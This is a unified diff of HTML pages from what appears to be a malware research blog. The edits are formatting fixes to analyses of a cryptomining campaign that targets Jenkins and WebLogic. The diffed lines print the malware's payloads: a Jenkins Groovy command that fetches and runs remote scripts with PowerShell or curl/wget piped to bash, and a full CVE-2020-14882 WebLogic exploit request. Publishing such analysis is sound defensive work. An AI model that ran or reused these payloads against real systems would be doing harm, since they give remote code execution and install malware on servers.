@@ -114,8 +114,8 @@ script URL. The jsp script will then drop and run the loaders.&lt;/p&gt;
 &lt;a href="#jenkins-port-8080" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Similar to previous exploits, the malware will brute force Jenkins login with
 password spraying and run the following payload:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;cmd@/c@powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)!bash@-c@(curl -fsSL %s || wget -q -O – %s) | bash
-println “%s”&amp;#43;”%s”;def s=new String(Base64.getDecoder().decode(“%s”&amp;#43;”%s”.reverse())).split(“!”);def c=System.getProperty(“os.name”).contains(“indo”)?s[0].split(“@”):s[1].split(“@”);c.execute()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;cmd@/c@powershell iex(New-Object Net.WebClient).DownloadString(&amp;#39;%s&amp;#39;)!bash@-c@(curl -fsSL %s || wget -q -O - %s) | bash
+println &amp;#34;%s&amp;#34;&amp;#43;&amp;#34;%s&amp;#34;;def s=new String(Base64.getDecoder().decode(&amp;#34;%s&amp;#34;&amp;#43;&amp;#34;%s&amp;#34;.reverse())).split(&amp;#34;!&amp;#34;);def c=System.getProperty(&amp;#34;os.name&amp;#34;).contains(&amp;#34;indo&amp;#34;)?s[0].split(&amp;#34;@&amp;#34;):s[1].split(&amp;#34;@&amp;#34;);c.execute()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -133,28 +133,28 @@ execution exploit CVE-2020-14882. It will send a get request to the WebLogic
 service, and use the GET request headers as part of the payload.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;GET
-/console/css/%%25%%32%%65%%25%%32%%65%%25%%32%%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(‘weblogic.work.ExecuteThread
+/console/css/%%25%%32%%65%%25%%32%%65%%25%%32%%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&amp;#39;weblogic.work.ExecuteThread
 %%20currentThread(weblogic.work.ExecuteThread)Thread.currentThread();weblogic.work.
 WorkAdapter%%20adapter=currentThread.getCurrentWork();java.lang.reflect.Field%%20
-field=adapter.getClass().getDeclaredField(“connectionHandler”);field.setAccessible
+field=adapter.getClass().getDeclaredField(&amp;#34;connectionHandler&amp;#34;);field.setAccessible
 (true);Object%%20obj=field.get(adapter);weblogic.servlet.internal.ServletRequestI
 mpl%%20req(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod
-(“getServletRequest”).invoke(obj);String%%20cmd=req.getHeader(“cmd”);String[]%%
-20cmds=System.getProperty(“os.name”).toLowerCase().contains(“win”)?new%%20String[]{“cmd.exe”,”/c”,req.getHeader(“win”)}:new%%20String[]{“/bin/sh”,”c”,req.getHeader
-(“linux”)};if(cmd!=null{String%%20result=new%%20java.util.Scanner(new%%20java.lang
-.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(“%%5C%%5CA”).next();
+(&amp;#34;getServletRequest&amp;#34;).invoke(obj);String%%20cmd=req.getHeader(&amp;#34;cmd&amp;#34;);String[]%%
+20cmds=System.getProperty(&amp;#34;os.name&amp;#34;).toLowerCase().contains(&amp;#34;win&amp;#34;)?new%%20String[]{&amp;#34;cmd.exe&amp;#34;,&amp;#34;/c&amp;#34;,req.getHeader(&amp;#34;win&amp;#34;)}:new%%20String[]{&amp;#34;/bin/sh&amp;#34;,&amp;#34;c&amp;#34;,req.getHeader
+(&amp;#34;linux&amp;#34;)};if(cmd!=null{String%%20result=new%%20java.util.Scanner(new%%20java.lang
+.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&amp;#34;%%5C%%5CA&amp;#34;).next();
 weblogic.servlet.internal.ServletResponseImpl%%20res(weblogic.servlet.internal.
-ServletResponseImpl)req.getClass().getMethod(“getResponse”).invoke(req);work.
+ServletResponseImpl)req.getClass().getMethod(&amp;#34;getResponse&amp;#34;).invoke(req);work.
 getServletOutputStream().writeStream(new%%20weblogic.xml.util.StringInputStream
 (result));work.getServletOutputStream().flush
-();}currentThread.interrupt();’) HTTP/1.0
+();}currentThread.interrupt();&amp;#39;) HTTP/1.0
 Host: %s:%d
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:82.0) Gecko/20100101 Firefox/82.0
 Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Connection: close
 cmd: ls
-linux: ( (curl -fsSL %s || wget -q -O – %s) | bash&amp;amp; )
-win: start powershell iex(New-Object Net.WebClient).DownloadString(‘%s’)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+linux: ( (curl -fsSL %s || wget -q -O - %s) | bash&amp;amp; )
+win: start powershell iex(New-Object Net.WebClient).DownloadString(&amp;#39;%s&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -316,9 +316,24 @@ classify any variants that are genetically similar.&lt;/p&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h4&gt;JSP&lt;span class="hx:absolute hx:-mt-20" id="jsp"&gt;&lt;/span&gt;
-&lt;a href="#jsp" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;644f20b5a6e03aa054ba62d32f983adc&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
+&lt;a href="#jsp" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;File name&lt;/th&gt;
+&lt;th&gt;File type&lt;/th&gt;
+&lt;th&gt;MD5&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;1.jsp&lt;/td&gt;
+&lt;td&gt;Java Server Page&lt;/td&gt;
+&lt;td&gt;644f20b5a6e03aa054ba62d32f983adc&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 &lt;div class="hx:overflow-x-auto hx:mt-6 hx:flex hx:flex-col hx:rounded-lg hx:border hx:py-4 hx:px-4 hx:border-gray-200 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-blue-200 hx:bg-blue-100 hx:text-blue-900 hx:dark:border-blue-200/30 hx:dark:bg-blue-900/30 hx:dark:text-blue-200"&gt;
 &lt;p class="hx:flex hx:items-center hx:font-medium"&gt;&lt;svg height=16px class="hx:inline-block hx:align-middle hx:mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
@@ -350,7 +365,7 @@ this threat &amp;ldquo;&lt;strong&gt;CopyMiner&lt;/strong&gt;&amp;rdquo;!&lt;/p&
 Implementing a multistage flexible approach with daily updates from multiple
 backup servers, a persistent backdoor for better control of the victim machines
 and even a more efficient
-&lt;a href="https://intezer.com/blog/research/a-rare-look-inside-a-cryptojacking-campaign-and-its-profit/"target="_blank" rel="noopener"&gt;cryptominer&lt;/a&gt;
+&lt;a href="../../../2021/01/a-rare-look-inside-a-cryptojacking-campaign-and-its-profit/"&gt;cryptominer&lt;/a&gt;
 for better consumption of the victim machine’s resources! &lt;strong&gt;The copycats took
 EternalMiner to the next level as an operation suitable for multiple victim’s
 machines&lt;/strong&gt;. In the following sections, we will drill down on each component of
@@ -415,7 +430,10 @@ configured with hardcoded c2 irc server (&lt;code&gt;asdgsd.uselesslongdomain[.]
 were able to connect to the live irc server using credentials hard coded in the
 malware. In the following picture you can see two victims currently logged in
 (running as root user).&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2017/07/eternalminer-copycats/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2017/07/eternalminer-copycats/images/fig5.png" title="Tsunami Backdoor" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Tsunami Backdoor&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
 &lt;h3&gt;Quickly adopting&lt;span class="hx:absolute hx:-mt-20" id="quickly-adopting"&gt;&lt;/span&gt;
 &lt;a href="#quickly-adopting" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We found that the domain used to host the payload file (&lt;code&gt;sdgndsfajfsdf[.]info&lt;/code&gt;)
 was registered on June 13th. Not only that but the first malicious
